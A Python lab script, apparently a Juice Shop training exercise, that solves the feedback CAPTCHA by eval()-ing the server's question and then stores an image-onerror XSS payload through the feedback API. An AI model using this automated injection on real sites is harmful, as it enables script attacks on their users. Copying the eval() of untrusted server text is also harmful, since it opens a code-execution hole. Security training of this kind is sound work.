import requests

# Juice Shop URL (as seen from inside your Kali container)
target = "http://juice_shop:3000"

# Step 1: Get CAPTCHA
print("[*] Fetching CAPTCHA...")
captcha_res = requests.get(f"{target}/rest/captcha/")
if captcha_res.status_code != 200:
    print("[-] Failed to retrieve CAPTCHA")
    exit(1)

captcha_data = captcha_res.json()
captcha_id = captcha_data["captchaId"]
question = captcha_data["captcha"]
answer = eval(question)  # e.g., "9*6+10" → 64

print(f"[+] CAPTCHA: {question} = {answer}")

# Step 2: Submit feedback with XSS payload
feedback_url = f"{target}/api/Feedbacks/"
payload = "<img src='x' onerror='alert(\"XSS\")'>"

data = {
    "comment": payload,
    "rating": 5,
    "captchaId": captcha_id,
    "captcha": str(answer)
}

headers = {"Content-Type": "application/json"}

print("[*] Sending XSS payload...")
res = requests.post(feedback_url, json=data, headers=headers)
if res.status_code == 201:
    print("[+] Payload stored!")
    print("[*] Go to 'About Us' or 'Score Board' to test if it triggers.")
else:
    print(f"[-] Failed to store payload: {res.status_code}")
    print("[!] Server said:", res.text)
